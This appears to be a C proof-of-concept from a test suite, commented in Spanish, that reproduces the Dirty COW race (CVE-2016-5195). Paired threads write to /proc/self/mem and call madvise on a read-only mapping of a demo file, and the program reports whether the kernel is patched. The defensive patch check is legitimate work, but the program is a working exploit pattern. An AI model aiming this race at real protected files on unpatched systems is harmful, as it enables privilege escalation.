/* PoC 4 (preguntas 3 y 9): patron de carrera de Dirty COW (CVE-2016-5195).
 *   hilo A: escribe a una pagina MAP_PRIVATE por /proc/self/mem (FOLL_FORCE+COW)
 *   hilo B: madvise(MADV_DONTNEED) descarta la copia COW entre medio.
 * En un kernel parcheado (>= 4.9, commit 19be0eaffa3a "mm: remove gup_flags
 * FOLL_WRITE games" -> FOLL_COW) el archivo NUNCA cambia. Se ejecuta SOLO sobre
 * un archivo propio de la demo, sin elevar privilegios. Verifica el parche. */
#include "common.h"
#include <pthread.h>
#include <stdint.h>
#include <sys/types.h>

static char *map; static volatile int stop; static int memfd;
static void *writer(void *a) {
	(void)a;
	while (!stop) { if (pwrite(memfd, "HACKEADO!!", 10, (off_t)(uintptr_t)map) < 0) { } }
	return NULL;
}
static void *adviser(void *a) {
	(void)a;
	while (!stop) madvise(map, 4096, MADV_DONTNEED);
	return NULL;
}
int main(int argc, char **argv)
{
	const char *path = argc > 1 ? argv[1] : "/tmp/mmapguard-demo/secret.dat";
	int secs = argc > 2 ? atoi(argv[2]) : 3;
	make_secret(path, 0444);
	int fd = open(path, O_RDONLY);
	if (fd < 0) { perror("open"); return EXIT_ERROR; }
	map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);   /* solo lectura */
	if (map == MAP_FAILED) {
		printf("[BLOQUEADO] mmap: %s\n", strerror(errno));
		return denied(errno) ? EXIT_BLOCKED : EXIT_ERROR;
	}
	memfd = open("/proc/self/mem", O_RDWR);
	if (memfd < 0) { perror("/proc/self/mem"); return EXIT_ERROR; }
	pthread_t t1, t2;
	pthread_create(&t1, NULL, writer, NULL);
	pthread_create(&t2, NULL, adviser, NULL);
	sleep(secs); stop = 1;
	pthread_join(t1, NULL); pthread_join(t2, NULL);
	if (file_intact(path)) {
		printf("[KERNEL PARCHEADO] %ds de carrera write/madvise: el archivo sigue intacto\n", secs);
		return EXIT_BLOCKED;
	}
	printf("[VULNERABLE] el archivo de solo lectura fue modificado (Dirty COW)!\n");
	return EXIT_ATTACK_OK;
}
